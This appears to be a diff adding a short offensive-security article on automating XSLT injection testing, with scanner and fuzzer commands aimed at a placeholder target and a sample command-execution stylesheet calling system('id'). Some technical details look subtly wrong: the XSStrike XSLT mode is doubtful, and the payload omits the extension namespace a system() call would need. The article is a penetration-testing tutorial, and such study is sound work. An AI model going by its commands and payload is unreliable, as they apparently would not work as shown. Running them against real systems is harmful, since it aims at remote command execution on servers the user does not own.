@@ -1,0 +1,105 @@
+---
+title: Automate XSLT Injection Testing & Exploitation
+description: Learn tools and techniques for automating discovery & exploitation of
+  XSLT injection vulnerabilities.
+keywords:
+- XSLT injection automation
+- vulnerability scanner
+- XSLT payload generator
+- fuzzing tools
+- Burp Suite extension
+- exploitation framework
+- automated testing
+- web application security
+---
+
+# Tools & Automation
+
+## Context
+
+This article aims to empower offensive operators to utilize automation and specialized tools to discover and exploit XSLT injection vulnerabilities in web applications. Readers are expected to understand how XSLT processing functions within web environments, be familiar with XML and XSLT syntax, and have experience with manual XSLT injection techniques.
+
+## Theory
+
+### Automation in XSLT Injection Testing
+
+Automation in XSLT injection exploits involves employing tools that can systematically scan and exploit potential vulnerabilities in web applications. These tools enhance the speed, coverage, and reproducibility of assessments. The typical attack sequence involves detecting potential injection points, sending crafted payloads, analyzing application responses, and executing successful exploits.
+
+### Categories of XSLT Injection Tooling
+
+There are different categories of tools designed for XSLT injection:
+
+- **Scanners:** These tools are used to discover potential XSLT injection points through automated request patterns and response analyses. 
+- **Payload Generators:** They are responsible for crafting both valid and malicious XSLT payloads that are essential for fuzzing and exploiting vulnerabilities.
+- **Fuzzers:** These mutate XSLT input data in an automated fashion to reveal unexpected application behavior or vulnerabilities.
+- **Exploitation Frameworks:** Such frameworks provide automation capabilities that cover discovery, exploitation, and post-exploitation phases.
+
+### Integration with Web Application Testing Suites
+
+XSLT injection tools can be integrated into broader web application security testing environments. This is often done through extensions or scripts within testing suites like Burp Suite, allowing for the inclusion of XSLT-specific payloads and detection mechanisms within automated assessment workflows.
+
+## Practice
+
+### Automated XSLT Injection Scanning with XSStrike
+
+- **Launch XSStrike:** Initiate a scan by running XSStrike with the XSLT mode enabled against a target endpoint.
+
+  ```bash
+  xsstrike --xslt --url http://target-app/upload
+  ```
+
+- **Output Analysis:** XSStrike outputs potential injection points, like the discovery of a vulnerability in a specific parameter.
+
+  ```
+  Potential XSLT injection point detected at parameter: file
+  ```
+
+This process identifies possible XSLT injection points automatically, saving considerable time and effort compared to manual testing.
+
+### Fuzzing XSLT Inputs with wfuzz
+
+- **Execute Fuzzing:** Engage wfuzz to fuzz the `xmlfile` parameter using a list of XSLT payloads while filtering default responses.
+
+  ```bash
+  wfuzz -c -z file,wordlists/xslt_payloads.txt --hs 'No error' -d 'xmlfile=FUZZ' http://target-app/upload
+  ```
+
+Using this approach helps in discovering vulnerabilities through the combination of payload fuzzing and response pattern analysis.
+
+### Generating XSLT Payloads with xsltgen
+
+- **Create Payloads:** Use xsltgen to produce XSLT payloads for specific attack vectors, such as command execution.
+
+  ```bash
+  xsltgen --template command_exec --output payload.xslt --cmd 'id'
+  ```
+
+- **Example Payload:**
+
+  ```xml
+  <?xml version="1.0"?>
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+      <xsl:template match="/">
+          <xsl:value-of select="system('id')"/>
+      </xsl:template>
+  </xsl:stylesheet>
+  ```
+
+These payloads enable effective exploitation by crafting valid XSLT documents for various attacks.
+
+### Using Burp Suite XSLT Injection Extension
+
+- **Setup Burp Suite Extension:** Add the XSLT Injection extension through Burp Suite's BApp Store to enhance testing capabilities.
+- **Configuration:** Set the extension's focus towards endpoints that handle XML uploads or transformations.
+- **Results Review:** Analyze the results gathered by the scanner for any discovered XSLT injection vulnerabilities.
+
+This semi-automated method integrates seamlessly into a typical testing workflow to provide comprehensive coverage.
+
+## Tools
+
+- **XSStrike**
+- **wfuzz**
+- **xsltgen**
+- **Burp Suite** 
+
+These tools are vital for automating the detection and exploitation of XSLT injection vulnerabilities.
